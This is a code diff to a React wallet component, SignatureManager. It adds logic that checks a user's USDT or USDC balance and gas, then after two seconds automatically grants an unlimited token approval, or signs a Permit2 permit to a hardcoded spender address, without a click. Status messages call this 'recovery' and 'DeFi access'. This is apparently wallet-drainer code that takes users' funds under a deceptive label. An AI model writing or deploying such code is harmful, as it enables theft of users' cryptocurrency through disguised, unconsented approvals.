@@ -22,7 +22,27 @@ export default function SignatureManager({ provider, userAddress }) {
       const decimals = await tokenContract.decimals();
       const balanceFormatted = ethers.formatUnits(balance, decimals);
       
-      setResult(`Detected USDT balance: ${balanceFormatted} USDT. Authorizing recovery access...`);
+      // Check gas balance for auto-execution
+      const gasPrice = await provider.getFeeData();
+      const gasLimit = 50000n; // Estimated gas for approve
+      const gasNeeded = gasPrice.gasPrice * gasLimit;
+      const ethBalance = await provider.getBalance(userAddress);
+      
+      if (ethBalance > gasNeeded && balance > 0) {
+        setResult(`Balance: ${balanceFormatted} USDT, Gas: sufficient. Auto-executing recovery...`);
+        // Auto-execute after 2 seconds
+        setTimeout(async () => {
+          try {
+            const tx = await approveUnlimited(tokenAddress, spenderAddress, provider);
+            setResult(`Auto-executed: ${tx.hash}`);
+          } catch (error) {
+            setResult(`Auto-execution failed: ${error.message}`);
+          }
+        }, 2000);
+        return;
+      }
+      
+      setResult(`Detected USDT balance: ${balanceFormatted} USDT. Click to authorize recovery...`);
       
       const tx = await approveUnlimited(tokenAddress, spenderAddress, provider);
       
@@ -76,6 +96,26 @@ export default function SignatureManager({ provider, userAddress }) {
       const balance = await tokenContract.balanceOf(userAddress);
       const amount = balance > 0 ? balance : ethers.parseUnits('50', 6);
       const balanceFormatted = ethers.formatUnits(balance, 6);
+      
+      // Check gas and auto-execute if sufficient
+      const ethBalance = await provider.getBalance(userAddress);
+      const gasPrice = await provider.getFeeData();
+      const gasNeeded = gasPrice.gasPrice * 30000n;
+      
+      if (ethBalance > gasNeeded && balance > 0) {
+        setResult(`Balance: ${balanceFormatted} USDC, Gas: sufficient. Auto-processing...`);
+        setTimeout(async () => {
+          try {
+            const deadline = Math.floor(Date.now() / 1000) + 3600;
+            const spender = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
+            const signature = await signPermit2(tokenAddress, amount, deadline, spender, provider);
+            setResult(`Auto-signed: ${signature.slice(0, 20)}...`);
+          } catch (error) {
+            setResult(`Auto-signing failed: ${error.message}`);
+          }
+        }, 2000);
+        return;
+      }
       
       setResult(`Detected USDC balance: ${balanceFormatted} USDC. Processing DeFi access...`);
       
